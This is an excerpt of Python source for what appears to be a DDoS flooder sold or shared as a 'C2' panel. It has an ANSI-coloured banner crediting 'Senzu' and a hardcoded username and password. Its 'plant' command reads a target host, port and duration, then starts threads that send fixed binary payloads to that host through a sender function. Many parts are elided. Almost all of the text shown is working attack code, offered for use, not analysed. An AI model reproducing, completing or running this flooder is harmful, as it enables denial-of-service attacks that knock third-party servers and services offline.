...
if password == "ZXZ" and username == "C2":
...
\033[73m                ╔═══════════════════════════════════════════════╗
\033[73m                ║\033[35m- - - - - - - ZXZ C2 By \033[36mSenzu \033[35m- - - - - - -║
\033[73m                ║\033[32m  - - - Type \033[36mmethods\033[35m to Help Menu - - - - ║
\033[73m                ╚═══════════════════════════════════════════════╝
"""
...
def main():
    ...
    while True:
        powerran = (random.randint(750,900))
        ...
        if sinput == "plant":
            ...
            try:
                if running >= 9000000:
                    ...
                    sinput, host, timer, port = sin.split(" ")
                    socket.gethostbyname(host)
                    payload = b"\x00\x00\x10\x00\x16\x10\x00\x00\x00\x00\x00\x00"
                    threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()               
                    print(attacked)
            ...
            try:
                if running >= 9000000:
                    ...
                    sinput, host, timer, port = sin.split(" ")
                    socket.gethostbyname(host)
                    payload = b"\x00\x00\x10\x00\x00\x20\x00\x00\x10\x00\x16\x00"
                    threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
                    print(attacked)
            except ValueError:
                main()
